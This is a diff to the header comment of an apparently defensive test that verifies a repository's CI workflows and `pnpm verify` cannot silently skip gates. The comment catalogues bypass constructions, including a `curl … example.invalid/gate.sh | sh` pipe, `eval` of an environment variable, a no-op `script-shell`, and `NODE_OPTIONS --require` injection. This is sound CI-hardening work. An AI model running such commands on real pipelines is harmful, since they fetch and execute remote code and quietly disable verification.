@@ -30,16 +30,16 @@
  *    Actions does not run a filename; it runs **every** file in that directory.
  *    Measured, not assumed: a second workflow carrying an unlisted gate, the
  *    crash-retry wrapper on a second job, and `cargo build` on a runner with no
- *    Tauri system dependencies left this file 16/16 green. Fixed by enumerating
+ *    Tauri system dependencies left this file green. Fixed by enumerating
  *    the directory, asserting over the union, and pinning the file list by name
  *    — see {@link WORKFLOW_FILES}.
  * 2. *A refusal that YAML quoting walked straight past.* The `uses:` refusals
  *    took the value as `(\S+)`, and a raw token carries its quotes, so
- *    `uses: "./.github/actions/foo"` matched no arm and was allowed. 17/17 green
+ *    `uses: "./.github/actions/foo"` matched no arm and was allowed. green
  *    with the line added; refused with the quotes removed.
  * 3. *The same hole, one YAML spelling over.* `uses:` with the value on the next
  *    line, or as a block scalar (`>-`, `|-`), read as *not a `uses:` line at
- *    all*. 36/36 green, three spellings.
+ *    all*. green, three spellings.
  * 4. *The key's spelling, not the value's.* Every fix above moved rightwards
  *    along the line — the value's quoting, the value's position, the value's
  *    block indicator. Nobody moved **leftwards**. The reader's key patterns
@@ -51,10 +51,10 @@
  *
  *    returned `undefined` — *"this is not a `uses:` key"*, the one claim the
  *    reader was entitled to make — and no refusal fired. Measured on this tree
- *    at `run-start-2026-08-17`: 42/42 green with the quotes, and the identical
+ *    at `run-start-2026-08-17`: green with the quotes, and the identical
  *    two steps with **bare** keys take the file down at module load. A flow
  *    mapping, `- { run: pnpm probe-unlisted-gate }`, was invisible to the same
- *    two patterns for the same reason, and also 42/42 green. The
+ *    two patterns for the same reason, and also green. The
  *    `inJobs !== inFile` net under the old `jobsIn` could not catch either:
  *    both counts missed the step equally, so the arithmetic still balanced.
  *
@@ -67,7 +67,7 @@
  * The old reader read the whole line correctly; the escape was downstream, in an
  * exemption that dropped any command where `command.startsWith('pnpm install')`.
  * Everything after the `&&` rode in on the prefix. Applied to all three jobs
- * that install: 42/42 green. The second spelling used the apt block scalar's own
+ * that install: green. The second spelling used the apt block scalar's own
  * backslash continuation —
  *
  *           libssl-dev libsecret-1-dev \
@@ -77,7 +77,7 @@
  * `apt-get install` reads as one command instead of a list of package names) is
  * what made it see less: the rejoined string begins `sudo apt-get`, so
  * `startsWith('sudo apt-get')` exempted the script chained onto its end. Also
- * 42/42 green. **Note that a perfect YAML parser does not touch this one.** It
+ * green. **Note that a perfect YAML parser does not touch this one.** It
  * hands back the identical single scalar. The fix is that a `run:` value is now
  * split into the simple commands the shell would run, and **every one of them**
  * must be accounted for; the setup exemptions are exact whole-command strings in
@@ -99,13 +99,13 @@
  *     "verify": "echo \"verify is temporarily a no-op. CI still runs: pnpm
  *      typecheck pnpm lint:rust pnpm test … cargo test --workspace --locked\""
  *
- * was 42/42 green, and the **same** no-op with the gate names deleted from the
+ * was green, and the **same** no-op with the gate names deleted from the
  * echoed string was 13 failed / 29 passed. The two runs execute exactly the same
  * amount of verification — none. The only difference between 13 red and 42 green
  * was the presence of a string inside an `echo`. A file whose top line is
  * "`pnpm verify` must be a superset of CI" certified a `verify` that was the
  * empty set. The milder construction this repository practically invites, and
- * which was also 42/42 green, leaves the chain intact and suppresses one gate's
+ * which was also green, leaves the chain intact and suppresses one gate's
  * failure — `ci.yml`'s own comments record `test:harness` crashing on ~14% of
  * Windows runs, so a developer writing
  *
@@ -130,7 +130,7 @@
  * asked whether they were still about the same command. So: strengthen CI's
  * build gate to `cargo build --workspace --locked --all-targets`, update the
  * row's `ci` because the accounting check makes you, leave `runs` describing the
- * command CI stopped running — **91/91 green**, with `pnpm verify` running
+ * command CI stopped running — **green**, with `pnpm verify` running
  * strictly less than CI. Note what this needed: no unusual YAML, no shell trick,
  * no quoting. It is the ordinary consequence of strengthening a CI gate, which
  * is a thing people do. The fix is {@link rowDrift}: a row's predicate must
@@ -143,7 +143,7 @@
  * "what it runs is not in this file". The identical unreadable value in a
  * `uses:` was admitted without comment — it starts with neither `./` nor `../`
  * and matches no `.yml@`, so every arm of {@link refuseUses} decided a target it
- * had never read. `uses: ${{ env.PROBE_ACTION }}` on two steps: **91/91 green**.
+ * had never read. `uses: ${{ env.PROBE_ACTION }}` on two steps: **green**.
  * Whether GitHub would run that step is not the question, for the same reason
  * given for the quoted key below: the value is not in the file, so a reader that
  * cannot see it must refuse rather than report that it found nothing harmful.
@@ -159,8 +159,7 @@
  *       run:
  *         shell: python
  *
- * set that same shell for every step in the workflow and left the file **91/91
- * green**, while the identical three lines *inside a job* are refused, because
+ * set that same shell for every step in the workflow and left the file **green**, while the identical three lines *inside a job* are refused, because
  * {@link JOB_KEYS} has no `defaults`. Listing a key as known is not knowing what
  * it does. The reader now resolves the shell a step actually runs under, and
  * takes `defaults:` apart the way it takes jobs and steps apart.
@@ -173,7 +172,7 @@
  * never whether a *shell operator* said the same thing about the same step. The
  * flag was even computed — {@link shellCommands} returns it — and then dropped
  * by a `.map(c => c.text)`, an unread write. So `run: pnpm test:harness || pnpm
- * test:harness` was **91/91 green**: `unaccounted` stayed empty because both
+ * test:harness` was **green**: `unaccounted` stayed empty because both
  * halves are listed gates, and every row went on asserting that CI runs the
  * harness gate while CI would ignore its failure. Its reader is now *every CI
  * gate can actually fail the job it is listed in*.
@@ -188,7 +187,7 @@
  * end of {@link refuseUses} and was classified, in silence, as a third-party
  * action whose contents are out of reach on purpose.
  *
- * The same composite action, four spellings, each **117/117 green** while the
+ * The same composite action, four spellings, each **green** while the
  * control `uses: ./.github/actions/probe-composite` was red twice on the same
  * tree:
  *
@@ -217,7 +216,7 @@
  * ## Defects twelve to sixteen: two models of FAILURE, no model of EXECUTION
  *
  * Measured on the tree carrying the fix for eleven, each construction twice,
- * each `141 passed (141)` with exit 0 twice — that tree's whole suite. Two
+ * each **green** with exit 0 twice — that tree's whole suite. Two
  * rounds of fixes turned both readers from text matchers into structure
  * parsers, and in doing so built two models of **failure propagation**:
  * `swallowedGates` on the workflow side, `gating` and `chainOf` on the verify
@@ -239,8 +238,7 @@
  * test:harness"` spliced into the chain put `{command: 'pnpm test:harness',
  * gating: true}` into {@link VERIFY_CHAIN} and satisfied the row. In every
  * shell `pnpm test:click-harness` succeeds, so the harness gate — which CI runs
- * in two places, once wrapped in a crash-retry — never executed. **141/141
- * green.** (Two, not three: `ci.yml`'s `test-ts` runs `pnpm test:harness` and
+ * in two places, once wrapped in a crash-retry — never executed. **green.** (Two, not three: `ci.yml`'s `test-ts` runs `pnpm test:harness` and
  * `test-windows` runs `node scripts/ci-retry-vitest-crash.mjs pnpm
  * test:harness`. Measured by filtering {@link COMMANDS} for the string, which
  * returns those two entries and no third; `test:harness` occurs on a third line
@@ -267,7 +265,7 @@
  * the whole group gating; `chainOf` follows every `pnpm <name>` edge exactly as
  * before; `VERIFY_CHAIN` is the shipped one plus one entry `exit 0`; there was
  * no totality check on this document, so the extra entry cost nothing and every
- * row's filter was non-empty. **141/141 green**, and `pnpm verify` ran nothing
+ * row's filter was non-empty. **green**, and `pnpm verify` ran nothing
  * and exited 0. Established separately, without invoking pnpm or verify:
  * `sh -c 'exit 0 && echo GATE_RAN'`, the same under `bash -c`, and the same
  * under `cmd //c` each printed nothing and exited 0 — including `cmd.exe`,
@@ -275,7 +273,7 @@
  * Windows.
  *
  * This is defect six one level down and in its own words. Six's headline was a
- * `verify` script that was one `echo` naming every gate, at 42/42 green, and
+ * `verify` script that was one `echo` naming every gate, at green, and
  * the stated fix was that `verify` is now "read as commands that execute, not
  * as text that mentions them". `exit 0 && …` is not a mention: every gate
  * behind it is a real, parsed, gating `pnpm` invocation in the program
@@ -304,7 +302,7 @@
  * it, the step was modelled as an ordinary gate, and *every CI gate can
  * actually fail the job it is listed in* — the case whose entire subject is
  * that a gate must be able to fail — stayed green about a step GitHub is
- * documented to ignore the failure of. **141/141 green** for one step and for
+ * documented to ignore the failure of. **green** for one step and for
  * all three `static` gate steps, while the byte-identical step spelled `true`
  * was red twice at module load. The hand-set case for this refusal planted only
  * the lowercase spelling, which is what let it pin the bytes rather than the
@@ -315,7 +313,7 @@
  *
  * Round two found the same disease in {@link refuseUses}, which separated a
  * remote reusable workflow from a third-party action with a case-sensitive
- * `.yml@` pattern: `gates.YML@main` was 141/141 green twice where the
+ * `.yml@` pattern: `gates.YML@main` was green twice where the
  * byte-identical `gates.yml@main` was red twice. That is not a one-off in one
  * regex — it is how this reader compared scalars generally, so adding a
  * case-insensitive flag to one pattern would have left the rest standing. Every
@@ -334,7 +332,7 @@
  * step-level key by name and argued at length why it must; {@link JOB_KEYS}
  * listed the identical key as one this reader "knows" and nothing read it. Set
  * on `static` it takes `pnpm typecheck`, `cargo fmt --all --check` and `cargo
- * clippy` out of the set of things that can fail CI: **141/141 green**. That is
+ * clippy` out of the set of things that can fail CI: **green**. That is
  * defect nine's own sentence — "listing a key as known is not knowing what it
  * does" — landing on the key next door, one round after nine was fixed. The
  * nearest thing to a disclosure was the header bullet saying this file does not
@@ -354,7 +352,7 @@
  * `refuseUses` admitted the action through {@link isThirdPartyAction}; `with`
  * was a known step key whose value {@link parseWorkflowYaml} consumed — so the
  * totality claim held *textually*, every line was read — and which was then
- * compared with nothing. **141/141 green**, while the same two commands written
+ * compared with nothing. **green**, while the same two commands written
  * as an ordinary `run:` step in the same position was `1 failed | 140 passed`.
  * Same file, same job, same commands, verdict decided by which key the text sat
  * under.
@@ -373,7 +371,7 @@
  * ## Defects seventeen to twenty-one: a totality owed over an invocation
  *
  * Measured on the tree carrying the fixes for twelve to sixteen, each
- * construction twice, each `172 passed (172)` with exit 0 twice — that file's
+ * construction twice, each **green** with exit 0 twice — that file's
  * whole suite at that commit, which is not a claim about the repository's.
  *
  * Round three gave the verify side the totality it deliberately lacked and
@@ -399,8 +397,8 @@
  * starts at `verify` and has no notion of a lifecycle edge. One key added to
  * `package.json` — `"postinstall": "node scripts/run-bash.mjs
  * scripts/probe-postinstall-gate.sh"` — with `ci.yml` byte-identical, was
- * **172/172 green**, twice, while the byte-identical command written as an
- * ordinary step in `static` was `1 failed | 171 passed (172)`, exit 1 twice, at
+ * **green**, twice, while the byte-identical command written as an
+ * ordinary step in `static` was **one red**, exit 1 twice, at
  * *every gate command in the workflows is accounted for above* ("a new CI
  * command appeared"). Same command, same repository, verdict decided by which
  * key it sits under. This is not the direction the file was built for: it is CI
@@ -425,10 +423,10 @@
  *     pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh" &&
  *       node -e "eval(process.env.PROBE||'')" &&
  *
- * was **172/172 green**, twice: both programs are on the list, so `sh`, `eval`,
+ * was **green**, twice: both programs are on the list, so `sh`, `eval`,
  * a pipe into `sh` and code taken from the environment were all in the chain,
  * all parsed, all gating and reached. The mirror is the finding — the same text
- * with `sh` in the program position was `1 failed | 171 passed (172)`, exit 1
+ * with `sh` in the program position was **one red**, exit 1
  * twice, with the message that names the property being violated. One invocation, two spellings, opposite verdicts,
  * inside the function round three added to close exactly this. On its own it
  * does not empty `verify`, because none of these can make the parent script
@@ -443,8 +441,8 @@
  * `cd` sat on round three's allowlist, admitted with a comment conceding that it
  * "changes what the commands after it do". A `verify` of `cd probe && pnpm
  * typecheck && … && cd ../src-tauri && cargo build …`, beside a
- * probe manifest whose eight scripts are `node -e ""`, was **172/172
- * green** with `ci.yml` untouched — and every one of the eight `pnpm <name>`
+ * probe manifest whose eight scripts are `node -e ""`, was **green** with
+ * `ci.yml` untouched — and every one of the eight `pnpm <name>`
  * invocations in that chain binds to `probe`'s no-op scripts, so the only
  * commands left doing anything are the two `cargo` gates written in `verify`'s
  * own body. The runtime half
@@ -456,7 +454,7 @@
  * the root's. The
  * mirror is again the finding — keep `cd probe`, keep the identical runtime
  * behaviour, rename one invocation to a script that exists in `probe`'s manifest
- * and not in the root's, and it is `1 failed | 171 passed (172)`, exit 1 twice,
+ * and not in the root's, and it is **one red**, exit 1 twice,
  * at *verify reaches the CI gate: 'pnpm typecheck'*. One referent, two
  * spellings, opposite verdicts. See {@link VerifyCommand.rebound}.
  *
@@ -470,8 +468,8 @@
  *
  *     script-shell=C:/Program Files/Git/usr/bin/true.exe
  *
- * to `.npmrc`, with `package.json` and `ci.yml` byte-identical, was **172/172
- * green**, exit 0 twice. Every `pnpm <script>` body is then handed to a program
+ * to `.npmrc`, with `package.json` and `ci.yml` byte-identical, was **green**,
+ * exit 0 twice. Every `pnpm <script>` body is then handed to a program
  * that ignores its argument and exits 0 — measured in a scratch package on pnpm
  * 10.33.0, where `pnpm verify` printed the body and neither of its two gate
  * lines, exit 0, against a control that printed both. The blast radius includes
@@ -489,7 +487,7 @@
  * each may carry and called that **the** bound on what a workflow hands an
  * admitted action; `refuseWith` read one of the two spellings.
  * `env: INPUT_RUN_INSTALL:` on the pinned `pnpm/action-setup@v4` step of
- * `static` was **172/172 green**, twice, while the byte-equivalent
+ * `static` was **green**, twice, while the byte-equivalent
  * `with: run_install:` on the identical step took that file down at module load,
  * exit 1 twice, by name. Nothing here
  * disclosed it: `env:` appeared in three header sentences, every one of them
@@ -501,7 +499,7 @@
  * ## Defects twenty-two to twenty-seven: which documents exist, and whether the run happens
  *
  * Measured on the tree carrying the fixes for seventeen to twenty-one, each
- * construction twice, each `181 passed (181)` with exit 0 twice — that file's
+ * construction twice, each **green** with exit 0 twice — that file's
  * whole suite at that commit, which is not a claim about the repository's. Each
  * is red twice on the tree this comment ships in; the counts are with the
  * defect's own entry.
@@ -518,7 +516,7 @@
  *   {@link SHELL_SETTING_FILES} names three files and refuses what it cannot
  *   parse; a *fourth* name is not refused, it is invisible. A tracked
  *   `.pnpmfile.cjs` — a JavaScript hook pnpm runs during `pnpm install`, the one
- *   command {@link SETUP_COMMANDS} exempts by name — was 181/181 green, while
+ *   command {@link SETUP_COMMANDS} exempts by name — was green, while
  *   the byte-equivalent work written as the manifest key {@link LIFECYCLE_SCRIPTS}
  *   closed was red. Fixed by pinning the membership of the repository root:
  *   {@link ROOT_FILES}.
@@ -526,19 +524,19 @@
  *   another.** `package.json` was bound as `{ scripts }`, and the `pnpm` block
  *   already in the tree — whose `onlyBuiltDependencies` decides which dependency
  *   install scripts run, factor 3 below — was read past in silence. A sibling
- *   `overrides` key was 181/181 green. Fixed by {@link MANIFEST_KEYS}.
+ *   `overrides` key was green. Fixed by {@link MANIFEST_KEYS}.
  * - **Twenty-four: a resolver's own doc described a refusal it did not make.**
  *   {@link yamlBoolean}'s comment said a quoted `"true"` resolved to
  *   `undefined`; `parseWorkflowYaml` strips the quotes before it is called, so
- *   `continue-on-error: 'false'` took the allow-branch at 181/181 green. Fixed
+ *   `continue-on-error: 'false'` took the allow-branch at green. Fixed
  *   by {@link yamlBooleanOf}, which resolves a boolean from a plain scalar only.
  * - **Twenty-five: `on:` decides whether any of this runs.** `paths-ignore:
  *   ['**']` on `push:` and `pull_request:`, with every gate byte-identical, was
- *   181/181 green against a CI that runs for no change at all. Fixed by
+ *   green against a CI that runs for no change at all. Fixed by
  *   {@link CI_TRIGGERS}.
  * - **Twenty-six: `needs:` as a name, not as an ordering.** Renaming the
  *   `static:` job and leaving its three `needs: static` lines makes GitHub
- *   reject the whole file, so no gate runs on any event; 181/181 green. The
+ *   reject the whole file, so no gate runs on any event; green. The
  *   header's licence for `needs` — "can only name, remove or reorder work" — is
  *   true of an ordering key and false of an unresolvable name. Fixed in
  *   {@link modelOf} against the job names of the file itself.
@@ -546,7 +544,7 @@
  *   three.** Round four's finding, unfixed for a round: {@link refuseEnvOnUses}
  *   only ever sees an `env:` beside a `uses:`, and GitHub merges the
  *   workflow-level and job-level blocks into every step. Both outer scopes were
- *   181/181 green with the same two lines the step-level refusal rejects. Fixed
+ *   green with the same two lines the step-level refusal rejects. Fixed
  *   by {@link refuseActionInputEnv}, at all three scopes and unconditionally.
  *
  * ## Defects twenty-eight and twenty-nine: whether the runner reaches the gate, and the one list that admitted by default
@@ -559,7 +557,7 @@
  *   whether the runner ever reaches that text. `if:` on a **job** had no reader
  *   at any scope — `grep` found the token only as a member of {@link JOB_KEYS}
  *   and {@link STEP_KEYS} — so `if: false` on `static`, which `test-ts`,
- *   `test-rust` and `test-windows` all `needs:`, was `196 passed (196)`, exit 0.
+ *   `test-rust` and `test-windows` all `needs:`, was **green**, exit 0.
  *   The mirror is what makes it this file's own class rather than a new opinion:
  *   the byte-equivalent statement of the same fact about the same job,
  *   `continue-on-error: true`, is `no tests`, exit 1, refused **by name** with
@@ -576,15 +574,15 @@
  *   hole one key over, and `NODE_OPTIONS: --require ./scripts/ci-probe-gate.cjs`
  *   and `NPM_CONFIG_SCRIPT_SHELL: /usr/bin/true` in the workflow-level `env:`
  *   are the same hole pointed at what a written command *means*. All five were
- *   `196 passed (196)`, exit 0. Fixed not by a fourth named refusal but by
+ *   **green**, exit 0. Fixed not by a fourth named refusal but by
  *   deleting the licence those keys sat under and pinning what they say:
  *   {@link CI_SETTINGS}, {@link settingsOf}, {@link PINNED_SETTING_KEYS}.
  * - **Twenty-nine: the one allow-by-default list in a refuse-by-default file.**
  *   {@link lifecycleScriptsIn} filters a manifest's script names against
  *   {@link LIFECYCLE_SCRIPTS}, so a hook name that list does not carry is not
  *   refused, it is invisible. pnpm's own documented `pnpm:devPreinstall` was
- *   `196 passed (196)`, exit 0, while the byte-identical body under
- *   `postinstall` was `1 failed | 195 passed (196)`, exit 1. Round five's critic
+ *   **green**, exit 0, while the byte-identical body under
+ *   `postinstall` was **one red**, exit 1. Round five's critic
  *   and both of round six's adversaries reached that construction
  *   independently. Fixed by pinning the complement — {@link SCRIPT_NAMES} — so
  *   that any script name is a review before anything decides what it is.
@@ -634,11 +632,14 @@
  *   That is defect thirteen: `exit 0 && <the whole shipped chain>` is twelve
  *   top-level simple commands, which {@link chainOf} expands to twenty-four,
  *   every one of them parsed, gating and reached, and it runs none of them.
- *   (Measured on the tree this comment ships in, by handing `chainOf` the
- *   shipped `verify` body with `exit 0 && ` in front: 24 chain entries, 24
- *   gating, 12 top-level, 8 of those `pnpm` invocations; the unspliced chain is
- *   23 and 11. An earlier version of this bullet said "thirteen real gating
- *   invocations", which is not a number this tree returns.) "Stricter" still
+ *   Those numbers are not quoted here any more: they are *an exit 0 in front of
+ *   verify expands to the same commands and runs none of them*, which hands
+ *   `chainOf` the shipped body with `exit 0 && ` in front and asserts the
+ *   twenty-four entries, all gating, twelve of them top-level and eight of
+ *   those `pnpm`, against the unspliced chain's twenty-three and eleven. An
+ *   earlier version of this bullet said "thirteen real gating invocations",
+ *   which is not a number this tree returns — RULE T, and the reason the
+ *   arithmetic is now a case rather than a sentence. "Stricter" still
  *   means verify may run gates CI does not; it no longer means verify may run
  *   invocations this reader has never classified.
  *
@@ -660,8 +661,8 @@
  *   longer true and the sentence saying it was is defect twenty-eight: every
  *   written value of both is now pinned by {@link CI_SETTINGS}, so moving the
  *   Clippy step's `working-directory: src-tauri` to another tree is
- *   `1 failed | 209 passed (210)`, exit 1, twice on the tree this comment ships
- *   in — the same edit was `196 passed (196)`, exit 0 one round ago.
+ *   **one red**, exit 1, twice on the tree this comment ships
+ *   in — the same edit was **green**, exit 0 one round ago.
  *   `defaults.run.working-directory` is still admitted without a pin, because
  *   `defaults` is taken apart by `modelOf` rather than reaching `settingsOf`;
  *   `defaults.run.shell` is refused, because that one changes how this reader
@@ -690,11 +691,11 @@
  *      not a tracked file, so it is not a thing a review of this repository
  *      could catch." `ci.yml` **is** a tracked file, and
  *      `NPM_CONFIG_SCRIPT_SHELL: /usr/bin/true` written in its workflow-level
- *      `env:` block was `196 passed (196)`, exit 0, twice on the tree that
+ *      `env:` block was **green**, exit 0, twice on the tree that
  *      shipped after round five, while the byte-equivalent `script-shell=` line
  *      in the tracked `.npmrc` was refused at module load by name. One referent,
  *      two tracked documents, opposite verdicts. Every `env:` value at every
- *      scope is pinned now, so the same line is `1 failed | 209 passed (210)`,
+ *      scope is pinned now, so the same line is **one red**,
  *      exit 1, twice on the tree this comment ships in. **Still unseen:** the
  *      same setting in a user or global `.npmrc`, or exported into the runner's
  *      environment by something outside every document this reader opens — which
@@ -708,8 +709,8 @@
  *      are refused outright by {@link LIFECYCLE_SCRIPTS} — which is a MEMBERSHIP
  *      filter and so could only ever object to a name somebody had already
  *      listed, which is defect twenty-nine: pnpm's own `pnpm:devPreinstall` was
- *      `196 passed (196)`, exit 0 on the tree that shipped after round five,
- *      against `1 failed | 195 passed (196)` for the byte-identical body under
+ *      **green**, exit 0 on the tree that shipped after round five,
+ *      against **one red** for the byte-identical body under
  *      `postinstall`. The complement is pinned now by {@link SCRIPT_NAMES}, so
  *      any script name at all is a review before {@link LIFECYCLE_SCRIPTS}
  *      decides what it is; the manifest key that
@@ -740,16 +741,16 @@
  *   the channel that could reach such a file without naming it in a command,
  *   and that channel is `env:`, which is pinned now: `NODE_OPTIONS: --require
  *   ./scripts/ci-probe-gate.cjs` in the workflow-level block was
- *   `196 passed (196)`, exit 0, twice on the tree that shipped after round five,
- *   and is `1 failed | 209 passed (210)`, exit 1, twice on this one. The limit
+ *   **green**, exit 0, twice on the tree that shipped after round five,
+ *   and is **one red**, exit 1, twice on this one. The limit
  *   that remains is the unpinned directory itself. And a mutation
  *   that replaces the enumeration's *result* with a copy of the pinned list is
  *   invisible to it — measured on the tree this comment ships in, twice:
- *   `ROOT_SURFACE = [...ROOT_FILES]` is `196 passed (196)`, exit 0. That is true
+ *   `ROOT_SURFACE = [...ROOT_FILES]` is **green**, exit 0. That is true
  *   of any pin whose expected value equals the truth, including
  *   {@link WORKFLOW_FILES}; what makes the enumeration more than a restatement
  *   is that {@link refuseScriptInterpretation} reads it, so emptying it is
- *   `2 failed | 194 passed (196)`, exit 1 twice.
+ *   **two reds**, exit 1 twice.
  * - **Which package a program name resolves to.** `dependencies`,
  *   `devDependencies` and `pnpm-lock.yaml` decide what `vitest`, `vite` and
  *   `tsc` actually are, and this reader compares none of them: it asserts which
@@ -774,18 +775,18 @@
  *   multiplying by MORE than one. `strategy: matrix: include: []` multiplies by
  *   zero — `pnpm test`, `pnpm test:harness`, `pnpm build` and
  *   `./scripts/check-transcripts.sh` written in CI and executed by it never —
- *   and was `196 passed (196)`, exit 0, twice on the tree that shipped after
+ *   and was **green**, exit 0, twice on the tree that shipped after
  *   round five. What the `if:` bullet used to say is that the invariant is
  *   one-directional, so a step the runner skips is not something this file
  *   objects to, measured **on a step**: `if: false` on the `Typecheck` step of
  *   `static`. The key it licensed by that measurement was the one on the **job**
  *   at the root of the `needs:` graph, and three spellings of it were each
- *   `196 passed (196)`, exit 0, twice on that tree: `if: false` on `static`,
+ *   **green**, exit 0, twice on that tree: `if: false` on `static`,
  *   the existing draft guard with its `github.event_name != 'pull_request' ||`
  *   clause deleted, and `if: github.event_name == 'workflow_dispatch'` on
  *   `test-windows`. Both keys are pinned by {@link CI_SETTINGS} now, at every
  *   scope, and each of those five constructions is
- *   `1 failed | 209 passed (210)`, exit 1, twice on the tree this comment ships
+ *   **one red**, exit 1, twice on the tree this comment ships
  *   in. The one-directional argument is still true and it is no longer an
  *   exemption: a step or job the runner skips is a **review**, because this
  *   reader cannot tell the skip that removes nothing from the skip that removes
@@ -802,7 +803,7 @@
  *   the whole `static:` job and nothing else is `no tests`, exit 1 twice — three jobs
  *   carry `needs: static`, and an unresolvable `needs:` is refused at module
  *   load (defect twenty-six). Deleting the job *and* those three lines, which is
- *   what the change would really look like, is `2 failed | 194 passed (196)`,
+ *   what the change would really look like, is **two reds**,
  *   exit 1, at *verify reaches the CI gate: 'cargo fmt --all --check'* and the
  *   same for `cargo clippy`, with `this test's list is stale: no workflow under
  *   .github/workflows/ runs "cargo fmt --all --check"`. It is the rows that go
@@ -814,7 +815,7 @@
  *   `actions/checkout@v4` *does* is out of reach on purpose. What this
  *   repository *hands* it is not, and defect sixteen is that only the first
  *   was ever asked: `uses: actions/github-script@v7` with two `pnpm` and
- *   `cargo` invocations under `with: script:` was 141/141 green on the tree
+ *   `cargo` invocations under `with: script:` was green on the tree
  *   that shipped after round two, in a file this reader had just parsed line by
  *   line. So the remaining hole is not "what {@link isThirdPartyAction}
  *   accepts" — that sentence stood here and was measurably wrong about the
@@ -829,7 +830,7 @@
  *   one-directional about the inputs it names, which is half of defect
  *   twenty-eight's RULE V finding. `refuseWith` refused an input the pin does
  *   not list and nothing asked whether a listed input was handed to anybody:
- *   adding `'probe-input'` to `actions/checkout@v4` was `196 passed (196)`, exit
+ *   adding `'probe-input'` to `actions/checkout@v4` was **green**, exit
  *   0, twice on the tree that shipped after round five, and is `1 failed | 209
  *   passed (210)`, exit 1, twice on the tree this comment ships in.** It said `with:`, and GitHub
  *   reaches the same inputs through `env: INPUT_<NAME>`; the correction said
@@ -864,10 +865,10 @@
  *   key these lists admit is one something reads or something pins* demands that
  *   the 24 distinct names in the three lists equal the union of
  *   {@link INTERPRETED_KEYS} and {@link PINNED_SETTING_KEYS}, in both
- *   directions. Appending `'container'` to `JOB_KEYS` was `196 passed (196)`,
+ *   directions. Appending `'container'` to `JOB_KEYS` was **green**,
  *   exit 0, twice on the tree that shipped after round five — with and without a
  *   real `container: image: …` on `test-ts` — and is
- *   `1 failed | 209 passed (210)` and `2 failed | 208 passed (210)`
+ *   **one red** and **two reds**
  *   respectively, exit 1, twice on the tree this comment ships in.
  *
  *   **The residue, stated because a pin reads as more than it is.** This closes
@@ -894,38 +895,42 @@
  *
  * ### Two claims this file does not make
  *
- * 1. **Defects one, two and three are inherited, not re-measured.** The counts
- *    quoted for them (16/16, 17/17, 36/36) are what an earlier header recorded;
- *    no round since has reproduced them. Every other count in this file was
- *    printed by a run, on the tree named next to it: defects four, five and six
- *    on this tree at `run-start-2026-08-17`; defects seven to ten on the tree
- *    carrying the fix for four to six, whose full suite was 91; defect eleven on
- *    the tree carrying the fix for seven to ten, whose full suite was 117;
- *    defects twelve to sixteen and round two's two findings on the tree
- *    carrying the fix for eleven, whose full suite was 141; defects seventeen to
- *    twenty-one on the tree carrying the fix for twelve to sixteen, whose full
- *    suite was 172; defects twenty-two to twenty-seven on the tree carrying the
- *    fix for seventeen to twenty-one, whose full suite was 181; defects
- *    twenty-eight and twenty-nine on the tree carrying the fix for twenty-two to
- *    twenty-seven, whose full suite was 196. Every count
- *    quoted against **the tree this comment ships in** is out of 210, and every
- *    one of them was run twice this round with its exit code read from the log
- *    body — including the ones that were true at 181 and are re-stated here,
- *    which had to be re-run rather than re-scaled. The counts that appear inside
- *    function doc comments and case comments below — 89/89, 91/91, 115/115,
- *    116/116, 117/117, 141/141, 172/172, 181/181, 196/196 — each name the tree that
- *    printed them, and each was printed by the round that made that change.
- *    **These are exact totals of one file's cases at one commit, not a range and
- *    not a bound** — the number moves whenever a case is added, and nothing
- *    about it is evidence for anything but the run that printed it.
+ * 1. **A mutation is recorded by the case it reddens and by the exit code,
+ *    never by a suite total.** Every suite total that used to stand in this
+ *    file is gone, and that is a class fix rather than a tidy-up.
  *
- *    Two of those series were graded and could not be reproduced from a commit,
- *    so they are marked here rather than left to look checkable: 89, 115 and 116
- *    are intra-round working states that were never committed, and the mutation
- *    counts attributed to trees before the immediately preceding one were each
- *    printed once, by the round that made the change, and not re-run since. The
- *    counts named against **the immediately preceding tree** (196) and against
- *    **this one** (210) were both run twice in this round.
+ *    Round six wrote the convention for totals into this very bullet — "every
+ *    count quoted against **the tree this comment ships in** is out of 210" —
+ *    and fourteen of the twenty sites carrying that phrase quoted a total out of
+ *    196, on a tree whose suite was 210. Every one of them reproduced the
+ *    claimed BEHAVIOUR and none reproduced the claimed TOTAL. That is round
+ *    two's wrong-number defect reappearing as a wrong PROVENANCE LABEL on right
+ *    numbers, inside the round that wrote the paragraph asserting the provenance
+ *    was right — and a paragraph is not a guard.
+ *
+ *    The reason to delete rather than to re-run is that a total is not evidence
+ *    about the mutation at all: it moves whenever a case is added ANYWHERE in
+ *    the file, so a round that adds cases makes every doc comment in the file
+ *    stale in one commit, and re-running a hundred mutations to re-state a
+ *    number that will be wrong again next round is how this defect survived six
+ *    of them. The two facts a mutation really is evidence for — **which case
+ *    reddened** and **what the process exited** — do not move when a case is
+ *    added. A count of REDS is kept where it separates one mutation from
+ *    another, because that is a property of the mutation and not of the suite.
+ *
+ *    And the convention is a case rather than a sentence: *no comment in this
+ *    file quotes a suite total* reads this file's own bytes and refuses any
+ *    `N passed (M)` or `N/M green` written anywhere in it. Six rounds have
+ *    established that the paragraph stating the rule is the thing that fails, so
+ *    the rule is asserted by something that can red.
+ *
+ *    **What is inherited and not re-measured.** Defects one, two and three came
+ *    with counts from an earlier header that no round since reproduced; those
+ *    are gone with the rest. Every behaviour claim this file attributes to **the
+ *    tree it ships in** was re-run twice this round, each with its exit code read
+ *    from the log body and its red set read from the log body. Claims attributed
+ *    to an **earlier** tree were printed once, by the round that made that
+ *    change, and have not been re-run — the tree label is what marks them.
  * 2. **Whether GitHub's own parser accepts `"run":` as a quoted mapping key was
  *    not established.** No YAML parser was run against GitHub. It does not
  *    matter here, and that is by construction rather than by luck: if GitHub
@@ -977,14 +982,14 @@ const WORKFLOW_DIRECTORY = ['.github', 'workflows'] as const;
  *
  * This is what decides whether a file in `.github/workflows/` is READ and
  * modelled or merely counted in {@link WorkflowSurface.ignoredFiles}, and it had
- * no case of its own: dropping `'.yaml'` was `196 passed (196)`, exit 0, twice
+ * no case of its own: dropping `'.yaml'` was **green**, exit 0, twice
  * on the tree that shipped after round five. The property survived by accident
  * — a real `.yaml` then lands in `ignoredFiles` and reddens the equality against
  * {@link IGNORED_WORKFLOW_FILES} — but an invariant that holds because of what
  * the tree happens to contain is not an invariant this file has asserted. The
  * rule is asked now of a directory this tree does not have, inside *every
  * workflow file the runner would load is one this guard reads*, and the same
- * mutation is `1 failed | 209 passed (210)`, exit 1, twice on the tree this
+ * mutation is **one red**, exit 1, twice on the tree this
